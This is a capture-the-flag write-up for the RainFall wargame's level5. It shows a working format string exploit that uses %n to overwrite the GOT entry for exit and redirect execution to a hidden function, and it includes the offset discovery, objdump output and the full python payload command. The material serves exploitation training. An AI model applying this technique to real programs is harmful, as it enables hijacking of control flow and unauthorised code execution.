We open the binary in [dogbolt](https://dogbolt.org/). We can see that we have to call the function `o`.

Here will do the same as previous levels.

Let's find the offset to the start of the buffer containing our input:
```Shell
level5@RainFall:~$ ./level5
AAAA %p %p %p %p %p %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```
Here we find that the start of our buffer can be access with `%4$p`


Here we see that the `n` function does not `return` but instead use a `exit` so it doesn't return in main.
So we will have to overwrite the address of the `exit` function.
To do that we will do a GOT overwrite, when a program is executed it initialized the GOT (Global offset Table) for every external function (like lib function),
it will cache the memory address from the function in the GOT so it doesn't have to ask the lib (here `libc`) for every external function call.

To see the GOT address of exit we can do :
```Shell
level5@RainFall:~$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```
Here the address of `exit` is : `08049838`
In little endian : `/x38/x98/x04/x08`


We find the address of `o`.
```Shell
level5@RainFall:~$ objdump -t level5
...
080484a4 g     F .text  0000001e              o
...
```
Address : `080484a4`
Converted in decimal : 134513828


Let's put this together:
Here we do not forget to subtract 4 bytes for the address of `exit`

```Shell
python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"' > /tmp/exploit1 && cat /tmp/exploit1 - | ./level5
```
The command can be a bit low because of the 134513828 that `printf` has to write

To go further :
https://axcheron.github.io/exploit-101-format-strings/
